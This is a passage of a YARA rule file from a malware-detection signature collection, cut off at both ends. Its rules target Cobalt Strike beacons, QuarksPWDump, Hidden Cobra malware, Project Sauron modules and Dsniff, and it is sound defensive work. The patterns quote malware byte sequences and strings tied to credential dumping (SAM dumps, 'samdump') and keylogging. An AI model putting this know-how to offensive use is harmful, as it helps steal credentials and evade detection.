		$s194 = { C2 C3 C2 C3 C2 C0 ?? ?? C2 C0 C2 C3 C2 C0 ?? ?? C2 C1 C2 C0 C2 C6 ?? ?? ?? ?? C2 C6 C2 C0 C2 C6 ?? ?? ?? ?? C2 C7 C2 C3 C2 C0 ?? ?? }
		$s195 = { C3 C2 C3 C2 C3 C1 ?? ?? C3 C1 C3 C2 C3 C1 ?? ?? C3 C0 C3 C1 C3 C7 ?? ?? ?? ?? C3 C7 C3 C1 C3 C7 ?? ?? ?? ?? C3 C6 C3 C2 C3 C1 ?? ?? }
		$s196 = { C4 C5 C4 C5 C4 C6 ?? ?? C4 C6 C4 C5 C4 C6 ?? ?? C4 C7 C4 C6 C4 C0 ?? ?? ?? ?? C4 C0 C4 C6 C4 C0 ?? ?? ?? ?? C4 C1 C4 C5 C4 C6 ?? ?? }
		$s197 = { C5 C4 C5 C4 C5 C7 ?? ?? C5 C7 C5 C4 C5 C7 ?? ?? C5 C6 C5 C7 C5 C1 ?? ?? ?? ?? C5 C1 C5 C7 C5 C1 ?? ?? ?? ?? C5 C0 C5 C4 C5 C7 ?? ?? }
		$s198 = { C6 C7 C6 C7 C6 C4 ?? ?? C6 C4 C6 C7 C6 C4 ?? ?? C6 C5 C6 C4 C6 C2 ?? ?? ?? ?? C6 C2 C6 C4 C6 C2 ?? ?? ?? ?? C6 C3 C6 C7 C6 C4 ?? ?? }
		$s199 = { C7 C6 C7 C6 C7 C5 ?? ?? C7 C5 C7 C6 C7 C5 ?? ?? C7 C4 C7 C5 C7 C3 ?? ?? ?? ?? C7 C3 C7 C5 C7 C3 ?? ?? ?? ?? C7 C2 C7 C6 C7 C5 ?? ?? }
		$s200 = { C8 C9 C8 C9 C8 CA ?? ?? C8 CA C8 C9 C8 CA ?? ?? C8 CB C8 CA C8 CC ?? ?? ?? ?? C8 CC C8 CA C8 CC ?? ?? ?? ?? C8 CD C8 C9 C8 CA ?? ?? }
		$s201 = { C9 C8 C9 C8 C9 CB ?? ?? C9 CB C9 C8 C9 CB ?? ?? C9 CA C9 CB C9 CD ?? ?? ?? ?? C9 CD C9 CB C9 CD ?? ?? ?? ?? C9 CC C9 C8 C9 CB ?? ?? }
		$s202 = { CA CB CA CB CA C8 ?? ?? CA C8 CA CB CA C8 ?? ?? CA C9 CA C8 CA CE ?? ?? ?? ?? CA CE CA C8 CA CE ?? ?? ?? ?? CA CF CA CB CA C8 ?? ?? }
		$s203 = { CB CA CB CA CB C9 ?? ?? CB C9 CB CA CB C9 ?? ?? CB C8 CB C9 CB CF ?? ?? ?? ?? CB CF CB C9 CB CF ?? ?? ?? ?? CB CE CB CA CB C9 ?? ?? }
		$s204 = { CC CD CC CD CC CE ?? ?? CC CE CC CD CC CE ?? ?? CC CF CC CE CC C8 ?? ?? ?? ?? CC C8 CC CE CC C8 ?? ?? ?? ?? CC C9 CC CD CC CE ?? ?? }
		$s205 = { CD CC CD CC CD CF ?? ?? CD CF CD CC CD CF ?? ?? CD CE CD CF CD C9 ?? ?? ?? ?? CD C9 CD CF CD C9 ?? ?? ?? ?? CD C8 CD CC CD CF ?? ?? }
		$s206 = { CE CF CE CF CE CC ?? ?? CE CC CE CF CE CC ?? ?? CE CD CE CC CE CA ?? ?? ?? ?? CE CA CE CC CE CA ?? ?? ?? ?? CE CB CE CF CE CC ?? ?? }
		$s207 = { CF CE CF CE CF CD ?? ?? CF CD CF CE CF CD ?? ?? CF CC CF CD CF CB ?? ?? ?? ?? CF CB CF CD CF CB ?? ?? ?? ?? CF CA CF CE CF CD ?? ?? }
		$s208 = { D0 D1 D0 D1 D0 D2 ?? ?? D0 D2 D0 D1 D0 D2 ?? ?? D0 D3 D0 D2 D0 D4 ?? ?? ?? ?? D0 D4 D0 D2 D0 D4 ?? ?? ?? ?? D0 D5 D0 D1 D0 D2 ?? ?? }
		$s209 = { D1 D0 D1 D0 D1 D3 ?? ?? D1 D3 D1 D0 D1 D3 ?? ?? D1 D2 D1 D3 D1 D5 ?? ?? ?? ?? D1 D5 D1 D3 D1 D5 ?? ?? ?? ?? D1 D4 D1 D0 D1 D3 ?? ?? }
		$s210 = { D2 D3 D2 D3 D2 D0 ?? ?? D2 D0 D2 D3 D2 D0 ?? ?? D2 D1 D2 D0 D2 D6 ?? ?? ?? ?? D2 D6 D2 D0 D2 D6 ?? ?? ?? ?? D2 D7 D2 D3 D2 D0 ?? ?? }
		$s211 = { D3 D2 D3 D2 D3 D1 ?? ?? D3 D1 D3 D2 D3 D1 ?? ?? D3 D0 D3 D1 D3 D7 ?? ?? ?? ?? D3 D7 D3 D1 D3 D7 ?? ?? ?? ?? D3 D6 D3 D2 D3 D1 ?? ?? }
		$s212 = { D4 D5 D4 D5 D4 D6 ?? ?? D4 D6 D4 D5 D4 D6 ?? ?? D4 D7 D4 D6 D4 D0 ?? ?? ?? ?? D4 D0 D4 D6 D4 D0 ?? ?? ?? ?? D4 D1 D4 D5 D4 D6 ?? ?? }
		$s213 = { D5 D4 D5 D4 D5 D7 ?? ?? D5 D7 D5 D4 D5 D7 ?? ?? D5 D6 D5 D7 D5 D1 ?? ?? ?? ?? D5 D1 D5 D7 D5 D1 ?? ?? ?? ?? D5 D0 D5 D4 D5 D7 ?? ?? }
		$s214 = { D6 D7 D6 D7 D6 D4 ?? ?? D6 D4 D6 D7 D6 D4 ?? ?? D6 D5 D6 D4 D6 D2 ?? ?? ?? ?? D6 D2 D6 D4 D6 D2 ?? ?? ?? ?? D6 D3 D6 D7 D6 D4 ?? ?? }
		$s215 = { D7 D6 D7 D6 D7 D5 ?? ?? D7 D5 D7 D6 D7 D5 ?? ?? D7 D4 D7 D5 D7 D3 ?? ?? ?? ?? D7 D3 D7 D5 D7 D3 ?? ?? ?? ?? D7 D2 D7 D6 D7 D5 ?? ?? }
		$s216 = { D8 D9 D8 D9 D8 DA ?? ?? D8 DA D8 D9 D8 DA ?? ?? D8 DB D8 DA D8 DC ?? ?? ?? ?? D8 DC D8 DA D8 DC ?? ?? ?? ?? D8 DD D8 D9 D8 DA ?? ?? }
		$s217 = { D9 D8 D9 D8 D9 DB ?? ?? D9 DB D9 D8 D9 DB ?? ?? D9 DA D9 DB D9 DD ?? ?? ?? ?? D9 DD D9 DB D9 DD ?? ?? ?? ?? D9 DC D9 D8 D9 DB ?? ?? }
		$s218 = { DA DB DA DB DA D8 ?? ?? DA D8 DA DB DA D8 ?? ?? DA D9 DA D8 DA DE ?? ?? ?? ?? DA DE DA D8 DA DE ?? ?? ?? ?? DA DF DA DB DA D8 ?? ?? }
		$s219 = { DB DA DB DA DB D9 ?? ?? DB D9 DB DA DB D9 ?? ?? DB D8 DB D9 DB DF ?? ?? ?? ?? DB DF DB D9 DB DF ?? ?? ?? ?? DB DE DB DA DB D9 ?? ?? }
		$s220 = { DC DD DC DD DC DE ?? ?? DC DE DC DD DC DE ?? ?? DC DF DC DE DC D8 ?? ?? ?? ?? DC D8 DC DE DC D8 ?? ?? ?? ?? DC D9 DC DD DC DE ?? ?? }
		$s221 = { DD DC DD DC DD DF ?? ?? DD DF DD DC DD DF ?? ?? DD DE DD DF DD D9 ?? ?? ?? ?? DD D9 DD DF DD D9 ?? ?? ?? ?? DD D8 DD DC DD DF ?? ?? }
		$s222 = { DE DF DE DF DE DC ?? ?? DE DC DE DF DE DC ?? ?? DE DD DE DC DE DA ?? ?? ?? ?? DE DA DE DC DE DA ?? ?? ?? ?? DE DB DE DF DE DC ?? ?? }
		$s223 = { DF DE DF DE DF DD ?? ?? DF DD DF DE DF DD ?? ?? DF DC DF DD DF DB ?? ?? ?? ?? DF DB DF DD DF DB ?? ?? ?? ?? DF DA DF DE DF DD ?? ?? }
		$s224 = { E0 E1 E0 E1 E0 E2 ?? ?? E0 E2 E0 E1 E0 E2 ?? ?? E0 E3 E0 E2 E0 E4 ?? ?? ?? ?? E0 E4 E0 E2 E0 E4 ?? ?? ?? ?? E0 E5 E0 E1 E0 E2 ?? ?? }
		$s225 = { E1 E0 E1 E0 E1 E3 ?? ?? E1 E3 E1 E0 E1 E3 ?? ?? E1 E2 E1 E3 E1 E5 ?? ?? ?? ?? E1 E5 E1 E3 E1 E5 ?? ?? ?? ?? E1 E4 E1 E0 E1 E3 ?? ?? }
		$s226 = { E2 E3 E2 E3 E2 E0 ?? ?? E2 E0 E2 E3 E2 E0 ?? ?? E2 E1 E2 E0 E2 E6 ?? ?? ?? ?? E2 E6 E2 E0 E2 E6 ?? ?? ?? ?? E2 E7 E2 E3 E2 E0 ?? ?? }
		$s227 = { E3 E2 E3 E2 E3 E1 ?? ?? E3 E1 E3 E2 E3 E1 ?? ?? E3 E0 E3 E1 E3 E7 ?? ?? ?? ?? E3 E7 E3 E1 E3 E7 ?? ?? ?? ?? E3 E6 E3 E2 E3 E1 ?? ?? }
		$s228 = { E4 E5 E4 E5 E4 E6 ?? ?? E4 E6 E4 E5 E4 E6 ?? ?? E4 E7 E4 E6 E4 E0 ?? ?? ?? ?? E4 E0 E4 E6 E4 E0 ?? ?? ?? ?? E4 E1 E4 E5 E4 E6 ?? ?? }
		$s229 = { E5 E4 E5 E4 E5 E7 ?? ?? E5 E7 E5 E4 E5 E7 ?? ?? E5 E6 E5 E7 E5 E1 ?? ?? ?? ?? E5 E1 E5 E7 E5 E1 ?? ?? ?? ?? E5 E0 E5 E4 E5 E7 ?? ?? }
		$s230 = { E6 E7 E6 E7 E6 E4 ?? ?? E6 E4 E6 E7 E6 E4 ?? ?? E6 E5 E6 E4 E6 E2 ?? ?? ?? ?? E6 E2 E6 E4 E6 E2 ?? ?? ?? ?? E6 E3 E6 E7 E6 E4 ?? ?? }
		$s231 = { E7 E6 E7 E6 E7 E5 ?? ?? E7 E5 E7 E6 E7 E5 ?? ?? E7 E4 E7 E5 E7 E3 ?? ?? ?? ?? E7 E3 E7 E5 E7 E3 ?? ?? ?? ?? E7 E2 E7 E6 E7 E5 ?? ?? }
		$s232 = { E8 E9 E8 E9 E8 EA ?? ?? E8 EA E8 E9 E8 EA ?? ?? E8 EB E8 EA E8 EC ?? ?? ?? ?? E8 EC E8 EA E8 EC ?? ?? ?? ?? E8 ED E8 E9 E8 EA ?? ?? }
		$s233 = { E9 E8 E9 E8 E9 EB ?? ?? E9 EB E9 E8 E9 EB ?? ?? E9 EA E9 EB E9 ED ?? ?? ?? ?? E9 ED E9 EB E9 ED ?? ?? ?? ?? E9 EC E9 E8 E9 EB ?? ?? }
		$s234 = { EA EB EA EB EA E8 ?? ?? EA E8 EA EB EA E8 ?? ?? EA E9 EA E8 EA EE ?? ?? ?? ?? EA EE EA E8 EA EE ?? ?? ?? ?? EA EF EA EB EA E8 ?? ?? }
		$s235 = { EB EA EB EA EB E9 ?? ?? EB E9 EB EA EB E9 ?? ?? EB E8 EB E9 EB EF ?? ?? ?? ?? EB EF EB E9 EB EF ?? ?? ?? ?? EB EE EB EA EB E9 ?? ?? }
		$s236 = { EC ED EC ED EC EE ?? ?? EC EE EC ED EC EE ?? ?? EC EF EC EE EC E8 ?? ?? ?? ?? EC E8 EC EE EC E8 ?? ?? ?? ?? EC E9 EC ED EC EE ?? ?? }
		$s237 = { ED EC ED EC ED EF ?? ?? ED EF ED EC ED EF ?? ?? ED EE ED EF ED E9 ?? ?? ?? ?? ED E9 ED EF ED E9 ?? ?? ?? ?? ED E8 ED EC ED EF ?? ?? }
		$s238 = { EE EF EE EF EE EC ?? ?? EE EC EE EF EE EC ?? ?? EE ED EE EC EE EA ?? ?? ?? ?? EE EA EE EC EE EA ?? ?? ?? ?? EE EB EE EF EE EC ?? ?? }
		$s239 = { EF EE EF EE EF ED ?? ?? EF ED EF EE EF ED ?? ?? EF EC EF ED EF EB ?? ?? ?? ?? EF EB EF ED EF EB ?? ?? ?? ?? EF EA EF EE EF ED ?? ?? }
		$s240 = { F0 F1 F0 F1 F0 F2 ?? ?? F0 F2 F0 F1 F0 F2 ?? ?? F0 F3 F0 F2 F0 F4 ?? ?? ?? ?? F0 F4 F0 F2 F0 F4 ?? ?? ?? ?? F0 F5 F0 F1 F0 F2 ?? ?? }
		$s241 = { F1 F0 F1 F0 F1 F3 ?? ?? F1 F3 F1 F0 F1 F3 ?? ?? F1 F2 F1 F3 F1 F5 ?? ?? ?? ?? F1 F5 F1 F3 F1 F5 ?? ?? ?? ?? F1 F4 F1 F0 F1 F3 ?? ?? }
		$s242 = { F2 F3 F2 F3 F2 F0 ?? ?? F2 F0 F2 F3 F2 F0 ?? ?? F2 F1 F2 F0 F2 F6 ?? ?? ?? ?? F2 F6 F2 F0 F2 F6 ?? ?? ?? ?? F2 F7 F2 F3 F2 F0 ?? ?? }
		$s243 = { F3 F2 F3 F2 F3 F1 ?? ?? F3 F1 F3 F2 F3 F1 ?? ?? F3 F0 F3 F1 F3 F7 ?? ?? ?? ?? F3 F7 F3 F1 F3 F7 ?? ?? ?? ?? F3 F6 F3 F2 F3 F1 ?? ?? }
		$s244 = { F4 F5 F4 F5 F4 F6 ?? ?? F4 F6 F4 F5 F4 F6 ?? ?? F4 F7 F4 F6 F4 F0 ?? ?? ?? ?? F4 F0 F4 F6 F4 F0 ?? ?? ?? ?? F4 F1 F4 F5 F4 F6 ?? ?? }
		$s245 = { F5 F4 F5 F4 F5 F7 ?? ?? F5 F7 F5 F4 F5 F7 ?? ?? F5 F6 F5 F7 F5 F1 ?? ?? ?? ?? F5 F1 F5 F7 F5 F1 ?? ?? ?? ?? F5 F0 F5 F4 F5 F7 ?? ?? }
		$s246 = { F6 F7 F6 F7 F6 F4 ?? ?? F6 F4 F6 F7 F6 F4 ?? ?? F6 F5 F6 F4 F6 F2 ?? ?? ?? ?? F6 F2 F6 F4 F6 F2 ?? ?? ?? ?? F6 F3 F6 F7 F6 F4 ?? ?? }
		$s247 = { F7 F6 F7 F6 F7 F5 ?? ?? F7 F5 F7 F6 F7 F5 ?? ?? F7 F4 F7 F5 F7 F3 ?? ?? ?? ?? F7 F3 F7 F5 F7 F3 ?? ?? ?? ?? F7 F2 F7 F6 F7 F5 ?? ?? }
		$s248 = { F8 F9 F8 F9 F8 FA ?? ?? F8 FA F8 F9 F8 FA ?? ?? F8 FB F8 FA F8 FC ?? ?? ?? ?? F8 FC F8 FA F8 FC ?? ?? ?? ?? F8 FD F8 F9 F8 FA ?? ?? }
		$s249 = { F9 F8 F9 F8 F9 FB ?? ?? F9 FB F9 F8 F9 FB ?? ?? F9 FA F9 FB F9 FD ?? ?? ?? ?? F9 FD F9 FB F9 FD ?? ?? ?? ?? F9 FC F9 F8 F9 FB ?? ?? }
		$s250 = { FA FB FA FB FA F8 ?? ?? FA F8 FA FB FA F8 ?? ?? FA F9 FA F8 FA FE ?? ?? ?? ?? FA FE FA F8 FA FE ?? ?? ?? ?? FA FF FA FB FA F8 ?? ?? }
		$s251 = { FB FA FB FA FB F9 ?? ?? FB F9 FB FA FB F9 ?? ?? FB F8 FB F9 FB FF ?? ?? ?? ?? FB FF FB F9 FB FF ?? ?? ?? ?? FB FE FB FA FB F9 ?? ?? }
		$s252 = { FC FD FC FD FC FE ?? ?? FC FE FC FD FC FE ?? ?? FC FF FC FE FC F8 ?? ?? ?? ?? FC F8 FC FE FC F8 ?? ?? ?? ?? FC F9 FC FD FC FE ?? ?? }
		$s253 = { FD FC FD FC FD FF ?? ?? FD FF FD FC FD FF ?? ?? FD FE FD FF FD F9 ?? ?? ?? ?? FD F9 FD FF FD F9 ?? ?? ?? ?? FD F8 FD FC FD FF ?? ?? }
		$s254 = { FE FF FE FF FE FC ?? ?? FE FC FE FF FE FC ?? ?? FE FD FE FC FE FA ?? ?? ?? ?? FE FA FE FC FE FA ?? ?? ?? ?? FE FB FE FF FE FC ?? ?? }
		$s255 = { FF FE FF FE FF FD ?? ?? FF FD FF FE FF FD ?? ?? FF FC FF FD FF FB ?? ?? ?? ?? FF FB FF FD FF FB ?? ?? ?? ?? FF FA FF FE FF FD ?? ?? }
		$fp1 = "ICSharpCode.Decompiler" wide

	condition:
		any of ( $s* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_Cobaltstrike_MZ_Launcher
{
	meta:
		description = "Detects CobaltStrike MZ header ReflectiveLoader launcher"
		author = "yara@s3c.za.net"
		id = "461a4741-11c5-53d9-b8e1-52d64cfe755b"
		date = "2021-07-08"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike_evasive.yar#L297-L307"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "aa188546db138dffdcdbf6538367b5d5bc37638a2784b24b7fcd913c15e56072"
		score = 75
		quality = 85
		tags = ""

	strings:
		$mz_launcher = { 4D 5A 41 52 55 48 89 E5 48 81 EC 20 00 00 00 48 8D 1D }

	condition:
		$mz_launcher
}

rule SIGNATURE_BASE_Cobaltstrike_Unmodifed_Beacon
{
	meta:
		description = "Detects unmodified CobaltStrike beacon DLL"
		author = "yara@s3c.za.net"
		id = "8eeb03f9-9698-5a46-b45b-224d5c3f3df7"
		date = "2019-08-16"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike_evasive.yar#L309-L320"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "10114a431fb70be8e18e67b22aa76bf2c0536f07d373f717c1dc51755e0847c9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$loader_export = "ReflectiveLoader"
		$exportname = "beacon.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_Quarkspwdump_Gen
{
	meta:
		description = "Detects all QuarksPWDump versions"
		author = "Florian Roth (Nextron Systems)"
		id = "7de4f59e-6cf5-5ad7-ae1f-8532d9e80c9e"
		date = "2015-09-29"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_quarkspwdump.yar#L2-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "327235260076f97c29acc1ca997205d08ef55fad795594fe2268f1d8e666d636"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"
		hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
		hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"
		hash4 = "c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab"
		hash5 = "677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa"
		hash6 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"
		hash7 = "8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819"

	strings:
		$s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
		$s2 = "%d dumped" fullword ascii
		$s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
		$s4 = "\\SAM-%u.dmp" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hiddencobra_Rule_1
{
	meta:
		description = "Detects Hidden Cobra Malware"
		author = "US CERT"
		id = "921c027e-fac3-5419-b0a6-5043f5cde466"
		date = "2017-06-13"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-164A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_hidden_cobra.yar#L11-L29"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e8bb844d72b7d7564caec0d0842889000c77611eeb24ac5c5cb35072a92c9d10"
		score = 75
		quality = 85
		tags = ""

	strings:
		$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94
            A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77
            48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39
            73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2
            AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED
            39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68
            3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13
            B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}

	condition:
		all of them
}

rule SIGNATURE_BASE_Hiddencobra_Rule_3
{
	meta:
		description = "Detects Hidden Cobra Malware"
		author = "US CERT"
		id = "39c7e039-4b07-575d-a93a-539ecc4e63d8"
		date = "2017-06-13"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-164A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_hidden_cobra.yar#L52-L82"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6c0e385e46fe9d6cde7d2bc8ef059cfd8c33ef5b17e9fcd7cea97863fb8d2c24"
		score = 75
		quality = 85
		tags = ""

	strings:
		$randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7
         44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41
         00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0
         6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24
         48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89
         44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24
         18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89
         44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00
         66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B
         6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05
         83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00
         00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B
         FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2
         49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33
         C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83
         E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00
         8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1
         C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8
         ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4
         48 C3 }

	condition:
		$randomUrlBuilder
}

rule SIGNATURE_BASE_APT_Project_Sauron_Scripts
{
	meta:
		description = "Detects scripts (mostly LUA) from Project Sauron report by Kaspersky"
		author = "Florian Roth (Nextron Systems)"
		id = "575a6f1b-5a4d-5f81-b44a-b7025dbec2a5"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "https://goo.gl/eFoP4A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_project_sauron_extras.yar#L1-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "275ec8de40ae973b4ec4c891c56a70fc2fd05abff258b8015d986d0106506367"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "local t = w.exec2str(\"regedit "
		$x2 = "local r = w.exec2str(\"cat"
		$x3 = "ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence"
		$x4 = "move O FakeVirtualEncryptedNetwork.dll"
		$x5 = "sinfo | basex b 32url | dext l 30"
		$x6 = "w.exec2str(execStr)"
		$x7 = "netnfo irc | basex b 32url"
		$x8 = "w.exec(\"wfw status\")"
		$x9 = "exec(\"samdump\")"
		$x10 = "cat VirtualEncryptedNetwork.ini|grep"
		$x11 = "if string.lower(k) == \"securityproviders\" then"
		$x12 = "exec2str(\"plist b | grep netsvcs\")"
		$x14 = "SAURON_KBLOG_KEY ="

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Dsniff
{
	meta:
		description = "Detects Dsniff hack tool"
		author = "Florian Roth (Nextron Systems)"
		id = "eb39185b-330f-5b93-ac58-0465e5767919"
		date = "2019-02-19"
		modified = "2023-12-05"
		reference = "https://goo.gl/eFoP4A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_project_sauron_extras.yar#L27-L39"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0edd3ba7e78ee2810aa3c7643a96382c1fe0b5e627913a5a9bac2e83c8d40274"
		score = 55
		quality = 85
		tags = ""

	strings:
		$x1 = ".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_Project_Sauron_Arping_Module
{
	meta:
		description = "Detects strings from arping module - Project Sauron report by Kaspersky"
		author = "Florian Roth (Nextron Systems)"
		id = "42389511-de92-57cb-9dee-9f829fd5e55a"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "https://goo.gl/eFoP4A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_project_sauron_extras.yar#L41-L55"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d87e91441994c4ed863596d79c108c9f72adfb708f885cb63a881eb25aa089b7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Resolve hosts that answer"
		$s2 = "Print only replying Ips"
		$s3 = "Do not display MAC addresses"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_Project_Sauron_Kblogi_Module
{
	meta:
		description = "Detects strings from kblogi module - Project Sauron report by Kaspersky"
		author = "Florian Roth (Nextron Systems)"
		id = "e1dd4d1a-1089-5897-8f4a-52c7068802fa"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "https://goo.gl/eFoP4A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_project_sauron_extras.yar#L57-L71"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bba87b17a62fc968e89d4f6d10de06875c6b7f47c8bb7ae3f7932804b23a8e87"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "Inject using process name or pid. Default"
		$s2 = "Convert mode: Read log from file and convert to text"
		$s3 = "Maximum running time in seconds"

	condition:
		$x1 or 2 of them
}

rule SIGNATURE_BASE_APT_Project_Sauron_Basex_Module
{
	meta:
		description = "Detects strings from basex module - Project Sauron report by Kaspersky"
		author = "Florian Roth (Nextron Systems)"
		id = "51ef3826-af5c-562b-a1f8-3bf11532ac2d"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "https://goo.gl/eFoP4A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_project_sauron_extras.yar#L73-L87"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "90cfb58017d62312c56908aca1a48bb7425f5cd51540298ecf65305b46ffb2c8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "64, 64url, 32, 32url or 16."
		$s2 = "Force decoding when input is invalid/corrupt"
		$s3 = "This cruft"

	condition:
		$x1 or 2 of them
}

rule SIGNATURE_BASE_APT_Project_Sauron_Dext_Module
{
	meta:
		description = "Detects strings from dext module - Project Sauron report by Kaspersky"
		author = "Florian Roth (Nextron Systems)"
		id = "d69373e0-d6ad-5475-8766-06e865620ed8"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "https://goo.gl/eFoP4A"
